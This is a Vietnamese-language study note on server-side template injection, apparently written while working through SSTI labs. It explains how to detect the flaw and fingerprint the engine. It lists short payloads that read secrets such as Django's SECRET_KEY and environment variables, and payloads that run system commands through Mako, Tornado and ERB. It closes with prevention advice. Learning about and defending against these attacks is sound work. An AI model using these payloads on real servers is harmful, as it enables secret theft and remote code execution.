sau khi học phần này, mình hiểu là...
SSTI là chỗ server đem input của mình nhét thẳng vào template rồi render.
-> thay vì coi input là string.
=> nó coi input là code.
-> thế là chạy luôn.

- template vs string, mình phân biệt thế này:
  - string: `render("Hello " + username)` với username là data.
  - -> an toàn nếu chỉ truyền data vào.
  - template: `render("Dear " + $_GET['name'])`.
  - -> chết ở đây. vì `name` thành 1 phần của template.
  - => attacker gửi `{{7*7}}` là server tính luôn.
- phát hiện, mình chỉ nhớ 1 trick:
  - gửi `{{7*7}}`.
  - -> nếu trả về `49` => dính SSTI.
  - -> nếu trả về `{{7*7}}` => nó chỉ là string thôi.
  - => đừng nhầm với `7777777`.
  - sau khi quan sát ... mình thấy `{{7*'7'}}` mới phân engine:
    - Twig thì ra `49`.
    - Jinja2 thì ra `7777777`.
    - -> vì Jinja nhân string là lặp string.
- đọc secret qua object, mình hiểu là:
  - nhiều engine để lộ object sẵn.
  - -> Django có `{{settings.SECRET_KEY}}`.
  - -> Jinja có `{{self.__init__.__globals__...}}`.
  - -> ERB có `<%= File.open('/path').read %>`.
  - => chỉ cần đoán đúng tên object là đọc được.
  - ví dụ ngắn mình hay thử:
    - `{{settings.SECRET_KEY}}`
    - `{{self._TemplateReference__context}}`
    - `${T(java.lang.System).getenv()}`
- RCE sơ lược, mình nhớ thế này:
  - Mako thì đơn giản nhất:
    - `<% import os %>${os.popen('id').read()}`
  - Tornado thì:
    - `{% import os %}{{os.popen('id').read()}}`
  - ERB thì:
    - `<%= system('id') %>`
  - -> bản chất là thoát sandbox rồi gọi hàm hệ thống.
- phòng chống, nên mình làm thế này:
  - đừng bao giờ render template từ input user.
  - -> chỉ truyền input vào dưới dạng data.
  - dùng engine logic-less như Mustache nếu được.
  - sandbox cũng chỉ là tạm thôi.
  - -> vì sandbox bypass nhiều lắm.
  - nhốt thêm Docker nữa cho chắc.

bài học mình rút ra:
-> thấy `49` là phải nghĩ SSTI ngay.
-> đừng đoán engine bằng 1 payload thôi.

liên quan:
-> [[server side template injection]]
-> [[Lab-SSTI basic]]
-> [[Lab-SSTI info disclosure via objects]]
-> [[Lab-SSTI engine-specific]]
